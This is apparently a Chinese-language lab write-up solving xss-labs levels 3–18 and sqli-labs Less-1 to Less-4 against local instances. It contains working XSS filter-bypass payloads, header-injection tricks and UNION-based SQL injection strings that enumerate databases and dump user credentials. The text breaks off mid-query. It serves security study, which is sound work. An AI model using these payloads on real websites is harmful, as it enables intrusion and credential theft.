\u0026lt;title\u0026gt;欢迎来到level3\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1 align=center\u0026gt;欢迎来到level3\u0026lt;/h1\u0026gt; \u0026lt;h2 align=center\u0026gt;没有找到和相关的结果.\u0026lt;/h2\u0026gt;\u0026lt;center\u0026gt; \u0026lt;form action=level3.php method=GET\u0026gt; \u0026lt;input name=keyword value=\u0026#39;\u0026#39;\u0026gt;\t\u0026lt;input type=submit name=submit value=搜索 /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/center\u0026gt;\u0026lt;center\u0026gt;\u0026lt;img src=level3.png\u0026gt;\u0026lt;/center\u0026gt; \u0026lt;h3 align=center\u0026gt;payload的长度:0\u0026lt;/h3\u0026gt;\u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 尝试闭合单引号\n查看源代码\nhtmlspecialchars() 是 PHP 中用于将特殊字符转换为 HTML 实体的核心安全函数，主要用于防止 XSS（跨站脚本攻击）并确保内容在 HTML 中正确显示。\n原字符 正确转换后的 HTML 实体 触发条件 \u0026amp; \u0026amp; 始终转换 \u0026quot; \u0026quot; 默认（ENT_COMPAT）或 ENT_QUOTES ' '（或 '*） 仅当设置 ENT_QUOTES 时 \u0026lt; \u0026lt; 始终转换 \u0026gt; \u0026gt; 始终转换 使用 htmlspecialchars 函数对 $str 进行转义\n利用onfocus事件绕过\njavascript\r1 \u0026#39; onfocus=javascript:alert()‘ 利用onclick事件绕过\nplain\r1 \u0026#39; οnclick=\u0026#39;javascript:alert()\u0026#39; level4_onfocus和οnclick plain\r1 \u0026#34; onfocus=javascript:alert() \u0026#34; level5_a href标签法 分析源代码：\nphp\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026lt;?php ini_set(\u0026#34;display_errors\u0026#34;, 0); $str = strtolower($_GET[\u0026#34;keyword\u0026#34;]); $str2=str_replace(\u0026#34;\u0026lt;script\u0026#34;,\u0026#34;\u0026lt;scr_ipt\u0026#34;,$str); $str3=str_replace(\u0026#34;on\u0026#34;,\u0026#34;o_n\u0026#34;,$str2); echo \u0026#34;\u0026lt;h2 align=center\u0026gt;没有找到和\u0026#34;.htmlspecialchars($str).\u0026#34;相关的结果.\u0026lt;/h2\u0026gt;\u0026#34;.\u0026#39;\u0026lt;center\u0026gt; \u0026lt;form action=level5.php method=GET\u0026gt; \u0026lt;input name=keyword value=\u0026#34;\u0026#39;.$str3.\u0026#39;\u0026#34;\u0026gt; \u0026lt;input type=submit name=submit value=搜索 /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/center\u0026gt;\u0026#39;; ?\u0026gt; \u0026lt;center\u0026gt;\u0026lt;img src=level5.png\u0026gt;\u0026lt;/center\u0026gt; \u0026lt;?php strtolower()函数用于将字符串中的所有大写字母转换为小写字母。非字母字符（如数字、符号、中文等）不受影响。 str_replace()函数，用于在字符串中查找并替换指定的内容。 这里我们使用a href标签法\nHTML 标签参考手册\n关于 HTML 中 \u0026lt;a\u0026gt; 标签（超链接）的 href 属性用法：HTML 标签_\nhref属性的意思是：当标签\u0026lt;a\u0026gt;被点击的时候，就会触发执行跳转，跳转到一个网站，还可以触发执行一段js代码。\n基础语法\n\u0026lt;a\u0026gt; 标签通过 href 属性定义链接目标，基本格式如下：\nhtml\r1 \u0026lt;a href=\u0026#34;目标地址\u0026#34;\u0026gt;链接文本或元素\u0026lt;/a\u0026gt; 点击元素：可以是文本、图片或其他 HTML 内容。 行为：点击后默认在当前页面跳转（可通过 target 属性控制）。 添加一个标签得闭合前面的标签，构建payload：\nhtml\r1 \u0026#34;\u0026gt; \u0026lt;a href=javascript:alert()\u0026gt;xxx\u0026lt;/a\u0026gt; \u0026lt;\u0026#34; 之后点击xxx\nlevel6_大写绕过 检查源代码：\nphp\r1 2 3 4 5 $str2=str_replace(\u0026#34;\u0026lt;script\u0026#34;,\u0026#34;\u0026lt;scr_ipt\u0026#34;,$str);//绕过js标签 $str3=str_replace(\u0026#34;on\u0026#34;,\u0026#34;o_n\u0026#34;,$str2);//绕过onfocus事件 $str4=str_replace(\u0026#34;src\u0026#34;,\u0026#34;sr_c\u0026#34;,$str3); $str5=str_replace(\u0026#34;data\u0026#34;,\u0026#34;da_ta\u0026#34;,$str4); $str6=str_replace(\u0026#34;href\u0026#34;,\u0026#34;hr_ef\u0026#34;,$str5);//绕过a href标签 没有添加小写转化函数 ，我们使用大写绕过：\n构建payload：\nhtml\r1 2 3 4 5 \u0026#34;\u0026gt; \u0026lt;sCript\u0026gt;alert()\u0026lt;/sCript\u0026gt; \u0026lt;\u0026#34; \u0026#34; Onfocus=javascript:alert() \u0026#34; \u0026#34;\u0026gt; \u0026lt;a hRef=javascript:alert()\u0026gt;x\u0026lt;/a\u0026gt; \u0026lt;\u0026#34; 三种都可以通关\nlevel7_双写绕过 php\r1 2 3 4 5 6 $str =strtolower( $_GET[\u0026#34;keyword\u0026#34;]);//大写转小写 $str2=str_replace(\u0026#34;script\u0026#34;,\u0026#34;\u0026#34;,$str);//过滤js标签 $str3=str_replace(\u0026#34;on\u0026#34;,\u0026#34;\u0026#34;,$str2);//过滤onfocus标签 $str4=str_replace(\u0026#34;src\u0026#34;,\u0026#34;\u0026#34;,$str3); $str5=str_replace(\u0026#34;data\u0026#34;,\u0026#34;\u0026#34;,$str4); $str6=str_replace(\u0026#34;href\u0026#34;,\u0026#34;\u0026#34;,$str5);//过滤a href标签 出现了俩个没见过东西：\nHTML 标签参考手册\nsrc(source):HTML 标签_source\n标签用于为媒体元素（视频/音频/图像）指定多个媒体资源。\ndata:（level6也有）HTML 标签_data\n标签用于添加给定内容的机器可读翻译。\n我们可以利用双拼写来绕过，\n比如on，我们可以写成oonn，当中间on被删掉的时候，就变成了on\n比如script，可以写成scscriptipt，当script被删掉的时候，就变成了script\n所以这关主要是双拼写绕过，方法有很多，\nhtml\r1 2 3 4 5 \u0026#34;\u0026gt; \u0026lt;a hrehreff=javasscriptcript:alert()\u0026gt;x\u0026lt;/a\u0026gt; \u0026lt;\u0026#34; \u0026#34;\u0026gt; \u0026lt;scscriptript\u0026gt;alert()\u0026lt;/scscriptript\u0026gt; \u0026lt;\u0026#34; \u0026#34;oonnfocus=javascript:alert() \u0026#34; level8_Unicode解码 php\r1 2 3 4 5 6 7 $str = strtolower($_GET[\u0026#34;keyword\u0026#34;]); $str2=str_replace(\u0026#34;script\u0026#34;,\u0026#34;scr_ipt\u0026#34;,$str); $str3=str_replace(\u0026#34;on\u0026#34;,\u0026#34;o_n\u0026#34;,$str2); $str4=str_replace(\u0026#34;src\u0026#34;,\u0026#34;sr_c\u0026#34;,$str3); $str5=str_replace(\u0026#34;data\u0026#34;,\u0026#34;da_ta\u0026#34;,$str4); $str6=str_replace(\u0026#34;href\u0026#34;,\u0026#34;hr_ef\u0026#34;,$str5); $str7=str_replace(\u0026#39;\u0026#34;\u0026#39;,\u0026#39;\u0026amp;quot\u0026#39;,$str6); 过滤掉了onfocus、src、data、href、script、\u0026quot;\n这一关利用href的隐藏属性自动Unicode解码，我们可以插入一段js伪协议\n在线Unicode编码：在线Unicode编码解码 - 码工具\nlevel9_Unicode解码 php\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 $str = strtolower($_GET[\u0026#34;keyword\u0026#34;]); $str2=str_replace(\u0026#34;script\u0026#34;,\u0026#34;scr_ipt\u0026#34;,$str); $str3=str_replace(\u0026#34;on\u0026#34;,\u0026#34;o_n\u0026#34;,$str2); $str4=str_replace(\u0026#34;src\u0026#34;,\u0026#34;sr_c\u0026#34;,$str3); $str5=str_replace(\u0026#34;data\u0026#34;,\u0026#34;da_ta\u0026#34;,$str4); $str6=str_replace(\u0026#34;href\u0026#34;,\u0026#34;hr_ef\u0026#34;,$str5); $str7=str_replace(\u0026#39;\u0026#34;\u0026#39;,\u0026#39;\u0026amp;quot\u0026#39;,$str6); echo \u0026#39;\u0026lt;center\u0026gt; \u0026lt;form action=level9.php method=GET\u0026gt; \u0026lt;input name=keyword value=\u0026#34;\u0026#39;.htmlspecialchars($str).\u0026#39;\u0026#34;\u0026gt; \u0026lt;input type=submit name=submit value=添加友情链接 /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/center\u0026gt;\u0026#39;; ?\u0026gt; \u0026lt;?php if(false===strpos($str7,\u0026#39;http://\u0026#39;)) { echo \u0026#39;\u0026lt;center\u0026gt;\u0026lt;BR\u0026gt;\u0026lt;a href=\u0026#34;您的链接不合法？有没有！\u0026#34;\u0026gt;友情链接\u0026lt;/a\u0026gt;\u0026lt;/center\u0026gt;\u0026#39;; } else { echo \u0026#39;\u0026lt;center\u0026gt;\u0026lt;BR\u0026gt;\u0026lt;a href=\u0026#34;\u0026#39;.$str7.\u0026#39;\u0026#34;\u0026gt;友情链接\u0026lt;/a\u0026gt;\u0026lt;/center\u0026gt;\u0026#39;; } ?\u0026gt; 使用strpos($str7, 'http://')检查$str7中是否包含子字符串http://。\nstrpos()返回http://首次出现的位置（整数），若未找到则返回false。 由于使用严格相等===比较返回值是否为false，只有完全未找到http://时条件成立。 那么我们可以在上一关的基础上加上http://，并且还需要加注释符将http://注释掉。\n构建payload：\u0026amp;#106;\u0026amp;#97;\u0026amp;#118;\u0026amp;#97;\u0026amp;#115;\u0026amp;#99;\u0026amp;#114;\u0026amp;#105;\u0026amp;#112;\u0026amp;#116;\u0026amp;#58;\u0026amp;#97;\u0026amp;#108;\u0026amp;#101;\u0026amp;#114;\u0026amp;#116;\u0026amp;#40;\u0026amp;#41;/*http://*/\nlevel10_onfocus 来到第十关发现没有输入框\n分析源码：\nphp\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;?php ini_set(\u0026#34;display_errors\u0026#34;, 0); $str = $_GET[\u0026#34;keyword\u0026#34;]; $str11 = $_GET[\u0026#34;t_sort\u0026#34;];//使用GET传参\u0026#34;t_sort\u0026#34; $str22=str_replace(\u0026#34;\u0026gt;\u0026#34;,\u0026#34;\u0026#34;,$str11);//过滤掉了\u0026lt;\u0026gt;号 $str33=str_replace(\u0026#34;\u0026lt;\u0026#34;,\u0026#34;\u0026#34;,$str22);//过滤掉了\u0026lt;\u0026gt;号 echo \u0026#34;\u0026lt;h2 align=center\u0026gt;没有找到和\u0026#34;.htmlspecialchars($str).\u0026#34;相关的结果.\u0026lt;/h2\u0026gt;\u0026#34;.\u0026#39;\u0026lt;center\u0026gt; \u0026lt;form id=search\u0026gt; \u0026lt;input name=\u0026#34;t_link\u0026#34; value=\u0026#34;\u0026#39;.\u0026#39;\u0026#34; type=\u0026#34;hidden\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;t_history\u0026#34; value=\u0026#34;\u0026#39;.\u0026#39;\u0026#34; type=\u0026#34;hidden\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;t_sort\u0026#34; value=\u0026#34;\u0026#39;.$str33.\u0026#39;\u0026#34; type=\u0026#34;hidden\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/center\u0026gt;\u0026#39;; ?\u0026gt; 构建payload：\nplain\r1 ?t_sort=\u0026#34; onfocus=javascript:alert() type=\u0026#34;text type=\u0026quot;text覆盖原输入的type属性。原本是type=\u0026quot;hidden\u0026quot;（隐藏输入框），注入后改为type=\u0026quot;text\u0026quot;，使输入框可见。\n浏览器解析HTML时，若同一属性重复，通常以最后一个为准。因此注入的type=\u0026quot;text\u0026quot;可能覆盖原隐藏属性，强制显示输入框以便用户交互\n之后点击输入框\nlevel11_referer 测试一下关键字\nxml\r1 \u0026#34; sRc DaTa OnFocus \u0026lt;sCriPt\u0026gt; \u0026lt;a hReF=javascript:alert()\u0026gt; \u0026amp;#106; plain\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;?php ini_set(\u0026#34;display_errors\u0026#34;, 0); $str = $_GET[\u0026#34;keyword\u0026#34;]; $str00 = $_GET[\u0026#34;t_sort\u0026#34;]; $str11=$_SERVER[\u0026#39;HTTP_REFERER\u0026#39;];//将HTTP请求头中的Referer信息赋值给变量$str11 $str22=str_replace(\u0026#34;\u0026gt;\u0026#34;,\u0026#34;\u0026#34;,$str11); $str33=str_replace(\u0026#34;\u0026lt;\u0026#34;,\u0026#34;\u0026#34;,$str22); echo \u0026#34;\u0026lt;h2 align=center\u0026gt;没有找到和\u0026#34;.htmlspecialchars($str).\u0026#34;相关的结果.\u0026lt;/h2\u0026gt;\u0026#34;.\u0026#39;\u0026lt;center\u0026gt; \u0026lt;form id=search\u0026gt; \u0026lt;input name=\u0026#34;t_link\u0026#34; value=\u0026#34;\u0026#39;.\u0026#39;\u0026#34; type=\u0026#34;hidden\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;t_history\u0026#34; value=\u0026#34;\u0026#39;.\u0026#39;\u0026#34; type=\u0026#34;hidden\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;t_sort\u0026#34; value=\u0026#34;\u0026#39;.htmlspecialchars($str00).\u0026#39;\u0026#34; type=\u0026#34;hidden\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;t_ref\u0026#34; value=\u0026#34;\u0026#39;.$str33.\u0026#39;\u0026#34; type=\u0026#34;hidden\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/center\u0026gt;\u0026#39;; ?\u0026gt; REFERER（Referer）是 HTTP 请求头 中的一个字段，用于表示当前请求的 来源页面 URL。它是浏览器在向服务器发送请求时自动附加的信息，告诉服务器用户是从哪个页面跳转过来的。\n先尝试一下第10关的?t_sort=\u0026quot; onfocus=javascript:alert() type=\u0026quot;text\n发现双引号被实体化\n试一下referer\n将referer改为：\nplain\r1 \u0026#34; onfocus=javascript:alert() type=\u0026#34;text level12_User-Agent头 隐藏的input标签可以插入type=\u0026ldquo;text\u0026quot;显示 ，可以一个一个尝试：\n测试一下关键字\nxml\r1 \u0026#34; sRc DaTa OnFocus \u0026lt;sCriPt\u0026gt; \u0026lt;a hReF=javascript:alert()\u0026gt; \u0026amp;#106; 第一、二传参没有回显\n第三个：可以看到被实体化\n只能是第四个：\nua是User-Agent头，使用bp抓包改ua头就可以了\n构造UA头：\nplain\r1 \u0026#34; onfocus=javascript:alert() type=\u0026#34;text 使用bp抓包\n将UA头修改\n放行后点击框\nlevel13_cookie头 依旧尝试前三个不成功\n测试关键字\nxml\r1 \u0026#34; sRc DaTa OnFocus \u0026lt;sCriPt\u0026gt; \u0026lt;a hReF=javascript:alert()\u0026gt; \u0026amp;#106; 名字是t_cook，考虑到是cookie头，我们先看一下这个网页的cookie\n将这里修改为：\nplain\r1 “ onfocus=javascript:alert() type=\u0026#34;text level14 xss-labs靶场-第十四关 iframe和exif xss漏洞 - FreeBuf网络安全行业门户\nHTML \u0026lt;iframe\u0026gt; 标签：作用是标记一个内联框架！！一个内联框架被用来在当前 HTML 文档中嵌入另一个文档。\nlevel15_ng-include ng-include 是 AngularJS 中的一个指令，用于在 HTML 中动态加载并嵌入外部的 HTML 片段。它允许你将一个外部的 HTML 文件或模板包含到当前的页面中，从而实现模块化和代码复用。\n包含第一关\n进行了实体转义：\n构造payload：\nplain\r1 ?src=\u0026#39;level1.php?name=\u0026lt;img src=XXX onmouseover=alert()\u0026gt;\u0026#39; level16_空格实体转义 测试一下关键字：\nplain\r1 ?keyword=\u0026#34; \u0026#39; sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P\u0026lt;/\u0026gt; \u0026lt;sCriPt\u0026gt; \u0026lt;a hReF=javascript:alert()\u0026gt; \u0026amp;#106; 将字母小写化，再把script和/替换成空格，最后将空格给实体化\n空格可以用回车来代替绕过，回车的url编码是%0a，再配合上不用 / 的\u0026lt;img\u0026gt;、\u0026lt;details\u0026gt;、\u0026lt;svg\u0026gt;等标签\npython\r1 ?keyword=\u0026lt;svg%0Aonload=alert()\u0026gt; level17_embed embed 是 HTML 中的一个标签，用于在网页中嵌入外部内容，例如 PDF 文件、视频、音频、Flash 动画等。\nembed将一个swf文件引到浏览器端\npayload：\nplain\r1 ?arg01= onmouseover\u0026amp;arg02=alert(1) onmouseover：表示当鼠标移动到该标签上时就会触发执行某项动作\n火狐不可以，edge可以：\nlevel18_embed 与level17一样：\n3、sqli-labs sql注入一般步骤： 一、判断注入类型\n数字型注入\nurl为 http://127.0.0.1/sqli-labs/Less-2/?id=1'时，因为有一个多余的\u0026quot;单引号\u0026quot;使查询语句错误 url为 http://127.0.0.1/sqli-labs/Less-2/?id=1 and 1=1时，没有报错 url为 http://127.0.0.1/sqli-labs/Less-2/?id=1 and 1=2时，由于1=2不成立，也会报错 满足这三个，基本上就是数字注入了\n字符型注入\nurl为 http://127.0.0.1/sqli-labs/Less-2/?id=1'时，数据库认为id叫做1\u0026rsquo;。查询之后发现没有这个id而返回错误。（在字符型注入中，需要考虑引号的闭合） url为 http://127.0.0.1/sqli-labs/Less-2/?id=1' and '1'='1 在'1\u0026rsquo;=\u0026lsquo;1之后没有加上\u0026rsquo;是因为传参时输入的内容已经被\u0026rsquo; \u0026lsquo;包围。 满足这俩个，基本上就是字符注入了\n二、后台查询列数\n使用order by试出数据库列数\nurl为 http://127.0.0.1/sqli-labs/Less-2/?id=1' order by 数字 （如果试4时有错误，3时正确，那么列数为3）\n三、找显示位\n使用union select找出会返回客户端并显示的列。如果有3列时，应该这么写\nurl为 http://127.0.0.1/sqli-labs/Less-2/?id=1' union select 1,2,3\n加入显示位是3，这就意味着数据库开放了5个“窗口”用来显示内容，用查询到的数据，在这些窗口显示数据\n四、查库名，获取当前数据名和版本号\n联合查询：select database();\n下面是查看数据库的版本和数据库信息\n假如显示位是3，http://127.0.0.1/sqli-labs/Less-2/?id=1' union select 1,version,database()\n五、查表名\n找到库名以后，使用http://127.0.0.1/sqli-labs/Less-2/?id=1' union select 1,2,table_name from information_schema.tables where table_schema='库名' (如果库名是字符型，此处库名要转成十六进制)\ninformation_schema:\n这是一个mysql自带的库，其中保存着关于mysql服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表列的数据类型与访问权限等，所以我们查询这个库\n六、查列名\n找到表之后，使用http://127.0.0.1/sqli-labs/Less-2/?id=1' union select 1,2,column_name from information_schema.columns where table_name='表名' (如果表名是字符型，此处库名要转成十六进制)\n如果表数或列数过多，可以在最后使用limit加上limit 0，5相当于检索1-5条信息\n七、查具体数据\n找到列之后，使用http://127.0.0.1/sqli-labs/Less-2/?id=1' union select 1,2,group_concat(\u0026quot;要查询的数据\u0026quot;) from 列名\n总结：\nplain\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 ?id=1 ?id=1\u0026#39;\t//出错 ?id=1 and 1=1\t//正常 ?id=1 and 1=2\t//出错 //检查为数字注入 ?id=1\u0026#39; and \u0026#39;1\u0026#39;=\u0026#39;1\t//正常 ?id=1\u0026#39;\t//出错\t//检查为字符注入 ?id=1 order by 3\t//查列数 ?id=-1 union select 1,2,3\t//找显示位 ?id=-1 union select 1,database(),version()\t//查库名，获取当前数据名和版本号 ?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;库名\u0026#39;\t//查表名 ?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=\u0026#39;表名\u0026#39;\t//查列名 ?id=-1 union select 1,2,group_concat(username ,id , password) from 列名\t//查字段 以下是 SQL 注入攻击的一般步骤总结 1. 探测注入点\n目标：寻找可能存在漏洞的输入参数（如 URL 参数、表单字段、Cookie 等）。 方法： 在参数后添加单引号 '，观察是否返回数据库错误（如 You have an error in your SQL syntax）。 使用逻辑测试： sql\r1 2 id=1\u0026#39; and \u0026#39;1\u0026#39;=\u0026#39;1 -- 正常返回 id=1\u0026#39; and \u0026#39;1\u0026#39;=\u0026#39;2 -- 无返回（说明条件生效，存在注入） 2. 判断注入类型\n基于错误（Error-Based）：直接通过报错信息获取数据（如 extractvalue(1, concat(0x7e, version()))）。 联合查询（UNION-Based）：利用 UNION SELECT 回显数据。 布尔盲注（Boolean Blind）：通过页面返回真假状态推断数据（如 AND 1=1 / AND 1=2）。 时间盲注（Time-Based）：通过延时函数判断条件（如 SLEEP(5)）。 3. 确定字段数\n方法：使用 ORDER BY 递增测试，直到报错： sql\r1 2 id=1\u0026#39; ORDER BY 3 --+ -- 正常 id=1\u0026#39; ORDER BY 4 --+ -- 报错（字段数为3） 目的：为后续 UNION SELECT 匹配列数。 4. 联合查询提取数据\n步骤： 强制原查询返回空：id=-1' UNION SELECT 1,2,3 --+。 观察页面回显位置（如显示数字 2 或 3）。 替换为敏感函数： sql\r1 2 id=-1\u0026#39; UNION SELECT 1,database(),version() --+ -- 回显数据库名和版本 5. 提取数据库信息\n核心表：通过 information_schema 获取元数据： sql\r1 2 3 4 5 6 7 8 -- 获取所有表名 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database() --+ -- 获取某表的列名（假设表名为users） UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name=\u0026#39;users\u0026#39; --+ -- 提取数据（假设列名为username,password） UNION SELECT 1,group_concat(username,\u0026#39;:\u0026#39;,password),3 FROM users --+ 靶场练习 Less-1-单引号_字符型 提示你输入数字值的ID作为参数\n**1.**输入?id=1,数字不同，显示不同\n这里进入到数据库里面查询\n**2.**接下来我们判断sql语句是否是拼接，是字符型还是数字型。\n3.可以根据结果指定是字符型且存在sql注入漏洞。因为该页面存在回显，所以我们可以使用联合查询。\n联合查询原理：联合查询就是两个sql语句一起查询，两张表具有相同的列数，且字段名是一样的。\n关于字符型注入： Less-1 的 SQL 语句结构 假设后端代码逻辑如下（字符型注入）：\nsql\r1 SELECT * FROM users WHERE id=\u0026#39;$id\u0026#39; LIMIT 0,1; $id 是用户输入的值，用单引号 ' 包裹。 注入的目标是闭合单引号并插入恶意代码，再用注释符 --+ 忽略后续内容。 两种输入对比分析 场景 1：?id=1 order by 3 --+\n生成的 SQL 语句为：\nsql\r1 SELECT * FROM users WHERE id=\u0026#39;1 order by 3 -- \u0026#39; LIMIT 0,1; 问题： 输入值 1 order by 3 --+ 被包裹在单引号内，整体视为一个字符串。 order by 3 是字符串内容，而非 SQL 语法。 实际执行的语句等价于： sql\r1 SELECT * FROM users WHERE id=\u0026#39;1 order by 3 \u0026#39; LIMIT 0,1; - 数据库会尝试查找 `id` 值为 `1 order by 3` 的记录（视为字符串），但表中无此数据，导致无回显。 场景 2：?id=1' order by 3 --+\n生成的 SQL 语句为：\nsql\r1 SELECT * FROM users WHERE id=\u0026#39;1\u0026#39; order by 3 -- \u0026#39; LIMIT 0,1; 关键点： 单引号 ' 用于闭合原始 SQL 中的 id='...'。 order by 3 被成功注入到 SQL 语句中，成为有效语法。 注释符 --+ 忽略后续的 ' LIMIT 0,1，最终执行： sql\r1 SELECT * FROM users WHERE id=\u0026#39;1\u0026#39; order by 3; - 此语句合法，会按第三列排序并返回数据，页面正常回显。 字符型注入 \u0026amp; 数字型注入 字符型注入（如 Less-1）： 参数被单引号包裹（id='$id'）。 必须闭合单引号才能注入代码，例如 1' [payload] --+。 未闭合单引号会导致语法错误或逻辑失效。 数字型注入（如 Less-2）： 参数未被引号包裹（id=$id）。 可直接注入代码，例如 1 order by 3 --+。 无需处理引号闭合问题。 关于注释符： 原始 SQL 语句的结构 假设后端代码的 SQL 语句如下（字符型注入）：\nsql\r1 SELECT * FROM users WHERE id=\u0026#39;$id\u0026#39; LIMIT 0,1; 其中 $id 是用户输入的值，用单引号 ' 包裹。\n输入 ?id=1' order by 3 的解析 当输入 1' order by 3 时，SQL 语句变为：\nsql\r1 SELECT * FROM users WHERE id=\u0026#39;1\u0026#39; order by 3\u0026#39; LIMIT 0,1; 问题：用户输入的单引号 ' 未闭合，导致语句变成： sql\r1 id=\u0026#39;1\u0026#39; order by 3\u0026#39; ... 末尾多了一个单引号 '，破坏了 SQL 语法。\n结果：数据库抛出语法错误，但应用程序可能配置为 不显示错误信息（如关闭错误回显），导致页面无回显。 输入 ?id=1' order by 3 --+ 的解析 当输入 1' order by 3 --+ 时，SQL 语句变为：\nsql\r1 SELECT * FROM users WHERE id=\u0026#39;1\u0026#39; order by 3 -- \u0026#39; LIMIT 0,1; 注释符 --+ 的作用： -- 是 SQL 的单行注释符，+ 在 URL 中被解析为空格，因此 --+ 等效于 -- （注释符后必须跟空格）。 注释符会忽略后续所有内容，即 ' LIMIT 0,1 被注释掉。 最终语句： sql\r1 SELECT * FROM users WHERE id=\u0026#39;1\u0026#39; order by 3; - 单引号 `'` 被正确闭合，语句语法合法。 - `order by 3` 会按第三列排序，如果表中存在至少 3 列，查询成功执行，页面正常回显数据。 关键差异总结 输入 SQL 语句 语法状态 回显原因 ?id=1' order by 3 id='1' order by 3' LIMIT ... 语法错误 错误被隐藏，无回显 ?id=1' order by 3 --+ id='1' order by 3 语法正确 查询正常执行，回显数据 补充： **注释符 **--+\n--:\n在 SQL 中表示单行注释，用于忽略后续代码。 +:\nURL 中的 + 会被解码为空格。由于某些数据库（如 MySQL）要求注释符 -- 后必须有一个空格，--+ 确保注释生效，避免语法错误。 解题： **第一步：**首先知道表格有几列，如果报错就是超过列数，如果显示正常就是没有超出列数。\n联合查询特点：\n1、要求多条查询语句的查询列数是一致的！\n2、要求多条查询语句的查询的每一列的类型和顺序最好一致\n3、union关键字默认去重，如果使用union all 可以包含重复项\nplain\r1 ?id=1\u0026#39;order by 3 --+ 显示正常没有超出列数\nplain\r1 ?id=1\u0026#39;order by 4 --+ 现在知道表格有三列\n**第二步：**爆出显示位，就是看看表格里面那一列是在页面显示的。\nplain\r1 ?id=-1\u0026#39; union select 1,2,3--+ 使用 id=-1 的目的 将 id 设置为 -1（或任意数据库中不存在的值）：\nsql\r1 SELECT * FROM users WHERE id = \u0026#39;-1\u0026#39; UNION SELECT 1,2,3 -- \u0026#39; 此时：\n第一条查询 (id=-1)：由于数据库中不存在 id=-1 的记录，这条查询会返回空结果。 第二条查询 (UNION SELECT 1,2,3)：会成为唯一的返回结果，页面会直接显示 1,2,3，从而暴露注入点的位置 如果使用 id=1：\nsql\r1 SELECT * FROM users WHERE id = \u0026#39;1\u0026#39; UNION SELECT 1,2,3 -- \u0026#39; 数据库会返回两条结果：\nid=1 的真实数据。 UNION SELECT 1,2,3 的注入数据。 但页面可能只会渲染第一条结果（真实数据），导致攻击者无法看到 UNION SELECT 的结果。而通过 id=-1 强制让原查询失效，可以确保注入结果直接暴露。\nid=-1** 的作用**：绕过原查询的结果，让 UNION SELECT 的注入内容成为唯一输出。 实战意义：这是 SQL 注入中常见的技巧，用于探测回显点，进而提取数据库信息（如版本、表名、字段值等）。 可以看到是第二列和第三列里面的数据是显示在页面的。\n**第三步：**获取当前数据名和版本号，这个涉及mysql数据库的一些函数，记得就行。\n补充知识：\nversion():查看数据库版本\ndatabase():查看使用的数据库\nuser():查看当前用户\nlimit:limit子句分批来获取所有数据\ngroup_concat():一次性获取所有的数据库信息\nsql\r1 ?id=-1\u0026#39;union select 1,database(),version()--+ 通过结果知道当前数据是security,版本是5.7.26\n第四步： 爆表，information_schema.tables表示该数据库下的tables表，点表示下一级。where后面是条件，group_concat()是将查询到结果连接起来。如果不用group_concat查询到的只有user。\n该语句的意思是查询information_schema数据库下的tables表里面且table_schema字段内容是security的所有table_name的内容。\nsql\r1 ?id=-1\u0026#39;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;security\u0026#39;--+ 爆出了表名\n看到了users,于是我们查看一下这张表的字段名\n补充知识:\ninformation_schema.tables:包含了数据库里所有的表\ntable_name:表名\ntable_schema:数据库名\ncolumn_name:字段名\n第五步：爆字段名\nplain\r1 ?id=-1\u0026#39;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=\u0026#39;users\u0026#39;--+ 该语句的意思是查询information_schema数据库下的columns表里面且table_users字段内容是users的所有column_name的内。注意table_name字段不是只存在于tables表，也是存在columns表中。表示所有字段对应的表名。\n看到了username和password字段，\n然后我们就去查询字段信息\n第六步：查字段\nplain\r1 ?id=-1\u0026#39; union select 1,2,group_concat(username ,id , password) from users--+ ​\n获得了所有的账号和密码，这样我们就顺利的拿到了很重要的信息。\nLess-2-数字型 首先判断下，这个是什么注入\nplain\r1 2 3 4 5 ?id=1\u0026#39;　//出错 ?id=1 and 1=1 //正常 ?id=1 and 1=2　//出错 可以确定为数字注入：\n接下来我们去查库\n列数为3：\n爆出显示位：\n爆表：\n爆字段名：\n查字段：得到了重要信息\nLess-3-单引号+括号_字符型 单引号测试报错,显示应该为单引号和括号组合的闭合方式\nplain\r1 ?id=1\u0026#39;) --+ 得到数据有三列\nplain\r1 ?id=1\u0026#39;) order by 4 --+ plain\r1 ?id=-1\u0026#39;) union select 1,2,3 --+ plain\r1 ?id=-1\u0026#39;) union select 1,database(),version() --+ sql\r1 ?id=-1\u0026#39;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema= \u0026#39;security\u0026#39; --+ sql\r1 ?id=-1\u0026#39;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=\u0026#39;users\u0026#39;--+ sql\r1 ?id=-1\u0026#39;) union select 1,2,group_concat(username,\u0026#39;:\u0026#39;,password) from users --+ Less-4-双引号+括号_字符型 less-4是双引号+括号的闭合方式\n修改一下闭合方式即可，其他与前三关一致。\nsql\r1 2 3 4 5 6 7 8 9 10 11 ?id=1\u0026#34;) order by 3--+ ?id=-1\u0026#34;) union select 1,2,3--+ ?id=-1\u0026#34;) union select 1,database(),version()--+ ?id=-1\u0026#34;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;security\u0026#39;--+ ?id=-1\u0026#34;) union select 1,2,group_concat(column_name) from information_schema.columns where 